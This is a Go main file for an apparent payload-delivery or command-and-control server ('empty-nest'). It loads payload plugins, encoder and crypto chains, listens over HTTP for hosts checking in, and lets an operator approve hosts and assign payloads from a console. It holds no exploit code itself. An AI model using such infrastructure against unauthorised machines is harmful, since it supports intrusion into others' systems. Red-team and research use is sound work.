package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/asdine/storm"
	"github.com/empty-nest/server"
)

func checkAndPanic(err error) {
	if err != nil {
		panic(err)
	}
}

var (
	db          *storm.DB
	payloadMap  map[string]emptynest.PayloadPlugin
	hostChanMap = map[int]chan emptynest.ApprovalResponse{}
)

func main() {
	config, err := emptynest.DecodeConfigFile("config.toml")
	checkAndPanic(err)

	db, err = storm.Open(config.DBFile)
	checkAndPanic(err)
	err = db.Init(&emptynest.Host{})
	checkAndPanic(err)
	err = db.Init(&emptynest.Payload{})
	checkAndPanic(err)

	reader := bufio.NewReader(os.Stdin)

	// TODO: catch ctrl-c db.Close()
	payloadMap, err = emptynest.PayloadMap(config.PayloadPluginDirectories)
	checkAndPanic(err)
	encoderChain, err := emptynest.BuildEncoderChain(config.EncoderPluginChain)
	checkAndPanic(err)
	cryptoChain, err := emptynest.BuildCryptoChain(config.CryptoPluginChain)
	checkAndPanic(err)
	var keyChain [][]byte
	for _, k := range config.KeyChain {
		key, err := hex.DecodeString(k)
		checkAndPanic(err)
		keyChain = append(keyChain, key)
	}
	infoPlugin, err := emptynest.BuildHostInfoPlugin(config.HostInfoPlugin)
	checkAndPanic(err)

	fmt.Println("[-] Starting server")
	serve := emptynest.Server{
		ApproveRequest: make(chan emptynest.ApprovalRequest),
		DB:             db,
		EncoderChain:   encoderChain,
		CryptoChain:    cryptoChain,
		KeyChain:       keyChain,
		HostInfo:       infoPlugin,
		GetLocation:    config.GetLocation,
		GetParam:       config.GetParam,
		PostLocation:   config.PostLocation,
		PostParam:      config.PostParam,
		Debug:          config.ServerDebug,
	}

	// TODO: This needs to be configurable and use TLS too.
	go func() {
		http.HandleFunc("/", serve.Handle)
		http.HandleFunc("/ping", func(w http.ResponseWriter, r *http.Request) {
			fmt.Fprint(w, "PONG\n")
		})
		panic(http.ListenAndServe(":8000", nil))
	}()

	// Listen for approval requests from the server.
	go func() {
		for {
			request := <-serve.ApproveRequest
			host := request.Host
			hostChanMap[host.ID] = request.Chan
			fmt.Printf("[!] APPROVAL REQUESTED:\nID: %d\nIPAddress: %s\nInfo:\n%s\n", host.ID, host.IPAddress, host.Info)
			fmt.Print("$> ")
		}
	}()

	fmt.Println("[-] Listening for messages")
	for {
		fmt.Print("$> ")
		text, _ := reader.ReadString('\n')
		text = strings.TrimRight(text, "\r\n")
		parts := strings.Split(text, " ")
		if len(parts) < 1 {
			continue
		}
		command := parts[0]
		args := []string{}
		if len(parts) > 1 {
			args = parts[1:]
		}
		switch command {
		case "exit":
			os.Exit(0)
		case "hosts":
			hosts(args)
		case "payloads":
			payloads(args)
		case "help":
			fmt.Printf("Valid comamnds:\nhosts\n\npayloads\n")
		default:
			fmt.Printf("[!] Unknown command %s. Try 'help'\n", text)
		}
	}
}
